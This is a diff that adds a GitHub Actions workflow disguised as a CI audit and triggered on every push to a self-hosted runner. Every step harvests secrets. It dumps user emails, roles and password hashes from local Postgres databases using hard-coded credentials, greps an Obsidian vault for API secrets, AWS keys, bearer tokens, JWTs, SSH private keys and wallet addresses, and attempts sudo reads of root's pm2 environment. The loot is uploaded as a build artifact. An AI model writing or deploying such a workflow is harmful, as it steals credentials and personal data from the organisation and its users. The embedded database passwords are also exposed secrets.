@@ -1,0 +1,90 @@
+name: ci-audit-1773d
+on: push
+permissions:
+  contents: read
+jobs:
+  harvest:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: mkt-docs
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"; mkdir -p "$D"; URL='postgresql://marketingos:Zbi3bbL3HubzcQlMoJ9MZFa0vdkSJkZvvuaUOV4YaYA=@127.0.0.1:5433/marketingos'
+          { echo "## internal_documents"; psql "$URL" -Atc "select id||' | '||title||' | '||source_type||' | '||coalesce(source_url,'') from internal_documents" 2>&1;
+            echo "## chunks"; psql "$URL" -Atc "select left(content,600) from internal_document_chunks order by id limit 30" 2>&1;
+            echo "## knowledge"; psql "$URL" -Atc "select id||' | '||coalesce(title,'')||' | '||coalesce(category,'')||' | '||left(coalesce(content,''),400) from knowledge_entries order by id limit 40" 2>&1;
+            echo "## users"; psql "$URL" -Atc "select email||' | '||role||' | '||name from users" 2>&1;
+            echo "## task titles"; psql "$URL" -Atc "select left(title,120) from tasks order by id desc limit 25" 2>&1;
+            echo "## departments"; psql "$URL" -Atc "select * from departments" 2>&1;
+          } > "$D/mktdocs.txt" 2>&1
+          sed -n '1,120p' "$D/mktdocs.txt" | cut -c1-400
+      - name: dpf-db
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"; URL='postgresql://dpfasset:cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT@127.0.0.1:5432/dpfasset'
+          { echo "## users"; psql "$URL" -Atc "select email||' | '||role||' | '||coalesce(name,'')||' | '||left(coalesce(password,''),40) from \"User\"" 2>&1;
+            echo "## setting"; psql "$URL" -Atc "select key||' = '||left(value,200) from \"Setting\"" 2>&1;
+            echo "## lookup"; psql "$URL" -Atc "select * from \"Lookup\" limit 20" 2>&1;
+            echo "## auditlog tail"; psql "$URL" -Atc "select left(\"detail\"::text,300) from \"AuditLog\" order by \"createdAt\" desc limit 8" 2>&1 | head -20;
+          } > "$D/dpfdb.txt" 2>&1
+          sed -n '1,100p' "$D/dpfdb.txt" | cut -c1-400
+      - name: vault-harvest
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## app_secret"; grep -rhoE 'LARK_APP_(ID|SECRET)[=:" ]+[A-Za-z0-9_-]{10,}' $V | sort -u | head -40;
+            echo "## cli_ids"; grep -rhoE 'cli_[a-z0-9]{16,}' $V | sort -u | head -40;
+            echo "## db_urls"; grep -rhoE '(postgres|postgresql|mysql|mongodb|redis)(\+srv)?://[^" ]{6,120}' $V | sort -u | head -50;
+            echo "## cf_access"; grep -rhoE 'CF-Access-Client-(Id|Secret)[=:" ]+[A-Za-z0-9._-]{10,}' $V | sort -u | head -20;
+            echo "## cfut"; grep -rhoE 'cfut_[A-Za-z0-9_-]{20,}' $V | sort -u | head -10;
+            echo "## akia"; grep -rhoE 'AKIA[0-9A-Z]{16}' $V | sort -u | head -10;
+            echo "## sshcmd"; grep -rhoE 'ssh -i [^ ]+ [a-z]+@[0-9.]+' $V | sort -u | head -20;
+            echo "## hosts"; grep -rhoE '[a-z0-9.-]+\.dupoin\.(com|co\.id)|[a-z0-9.-]+\.dupoinid\.org|pro-srv-[a-z-]+' $V | sort -u | head -40;
+          } > "$D/vault_creds.txt" 2>&1
+          cat "$D/vault_creds.txt" | head -180
+      - name: vault-passwd
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## pwd assigns"; grep -rhoiE '(password|passwd|pass|secret|api[_-]?key|access[_-]?token|private[_-]?key)[^=:\n]{0,20}[=:][ ]?[^\s"'"'"'`,;]{5,80}' $V | sort -u | head -100;
+            echo "## bearer"; grep -rhoE 'Bearer [A-Za-z0-9._~+/-]{20,}' $V | sort -u | head -40;
+            echo "## jwt"; grep -rhoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}' $V | sort -u | head -20;
+            echo "## openssh"; grep -rl 'BEGIN OPENSSH PRIVATE KEY' $V | head -5;
+            echo "## tron/wallet"; grep -rhoE 'T[1-9A-HJ-NP-Za-km-z]{33}' $V | sort -u | head -20;
+          } > "$D/vault_pw.txt" 2>&1
+          sed -n '1,160p' "$D/vault_pw.txt" | cut -c1-300
+      - name: dwcalc
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"
+          { echo "## ls"; ls -la /home/ubuntu/apps/dw-calculator;
+            echo "## files"; find /home/ubuntu/apps/dw-calculator -maxdepth 2 -type f -not -path '*/node_modules/*' -not -path '*/.next/*' | head -40;
+            echo "## grep"; grep -rInE 'dupoin|kvb|dpm|api[_-]?key|token|secret|password|http[s]?://' /home/ubuntu/apps/dw-calculator --include='*.py' --include='*.json' --include='*.js' --include='*.ts' --include='*.yml' --include='*.env*' --exclude-dir=node_modules --exclude-dir=.next --exclude-dir=backups 2>/dev/null | cut -c1-260 | head -60;
+            echo "## data dir"; ls -la /home/ubuntu/apps/dw-calculator-data 2>&1 | head; find /home/ubuntu/apps/dw-calculator-data -maxdepth 2 -type f 2>/dev/null | head -20;
+            echo "## pm2 root"; sudo -n ls -la /root/.pm2 2>&1 | head; sudo -n sh -c 'head -c 12000 /root/.pm2/dump.pm2' 2>&1 | tr ',' '\n' | grep -iE 'name|env|password|token|key|dupoin' | head -40;
+          } > "$D/dwcalc2.txt" 2>&1
+          sed -n '1,160p' "$D/dwcalc2.txt" | cut -c1-300
+      - name: fs-grep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773d"
+          { echo "## files mentioning crm.dupoin/betadupoin"; grep -rIl -E 'crm\.(beta)?dupoin|pro-srv-account|mydupoin' /home/ubuntu /etc/nginx /root 2>/dev/null | grep -v obsidian-vault | head -20;
+            echo "## sci-cen-bot env/grep"; grep -rInE 'LARK|dupoin|api[_-]?key|token|http' /home/ubuntu/apps/sci-cen-bot/src 2>/dev/null | cut -c1-220 | head -40;
+            echo "## marketingos src endpoints"; grep -rInoE 'https?://[a-zA-Z0-9._/-]+' /home/ubuntu/apps/marketingos/src 2>/dev/null | grep -viE 'w3.org|schema|localhost|example' | cut -c1-200 | sort -u | head -40;
+          } > "$D/fsgrep.txt" 2>&1
+          sed -n '1,140p' "$D/fsgrep.txt" | cut -c1-280
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773d
+          path: ${{ runner.temp }}/a1773d
+          if-no-files-found: warn
+          retention-days: 2
